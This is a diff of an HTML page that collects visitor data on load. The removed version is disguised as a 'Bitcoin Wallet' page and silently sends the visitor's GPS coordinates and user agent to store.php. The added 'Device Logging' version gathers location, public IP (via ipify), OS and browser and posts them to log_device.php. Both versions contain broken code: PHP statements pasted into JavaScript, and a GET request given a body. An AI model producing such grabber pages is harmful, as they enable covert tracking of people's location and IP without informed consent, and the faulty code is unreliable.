@@ -1,36 +1,67 @@
-<html>
-<body onload="getLocation()">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Logging</title>
+    <script>
+        function getDeviceInfo() {
+            // Get GPS Coordinates
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var lat = position.coords.latitude;
+                    var long = position.coords.longitude;
 
-<div style="text-align:center;">
-  <br/><br/><br/>
-<h1>Bitcoin Wallet</h1>
-<h3>3BLBJ7JDcdsvF89JAQjbHqqu6F7V9sPeyh</h3>
-</div>
+                    // Get IP address using a third-party API (e.g., ipify)
+                    fetch('https://api.ipify.org?format=json')
+                        .then(response => response.json())
+                        .then(data => {
+                            var ip = data.ip;
 
+                            // Get browser and OS details
+                            var userAgent = navigator.userAgent;
+                            var os = "Unknown OS";
+                            if (userAgent.indexOf("Windows NT") !== -1) os = "Windows";
+                            else if (userAgent.indexOf("Mac OS") !== -1) os = "MacOS";
+                            else if (userAgent.indexOf("Android") !== -1) os = "Android";
+                            else if (userAgent.indexOf("Linux") !== -1) os = "Linux";
+                            
+                            var browser = "Unknown Browser";
+                            if (userAgent.indexOf("Chrome") !== -1) browser = "Chrome";
+                            else if (userAgent.indexOf("Firefox") !== -1) browser = "Firefox";
+                            else if (userAgent.indexOf("Safari") !== -1) browser = "Safari";
+                            else if (userAgent.indexOf("Edge") !== -1) browser = "Edge";
 
+                            // Send the data to PHP server for logging
+                            var data = {
+                                lat: lat,
+                                long: long,
+                                ip: ip,
+                                os: os,
+                                browser: browser
+                            };
 
+                            // Use fetch to send the data to PHP
+                            fetch('log_device.php', {
+                                method: 'GET',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify(data)
+                            });
+                        });
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
 
-
-<script>
-
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else {
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
-}
-
-function showPosition(position) {
-  if (fwrite($myfile, $txt) === false) {
-    echo "Error writing to file.";
-} else {
-  const xhttp = new XMLHttpRequest();
-  xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
-  xhttp.send();
-  }
-}
-</script>
-
+        // Call the function on page load
+        window.onload = getDeviceInfo;
+    </script>
+</head>
+<body>
+    <h1>Device Logging</h1>
+    <p>Logging your device information...</p>
 </body>
 </html>
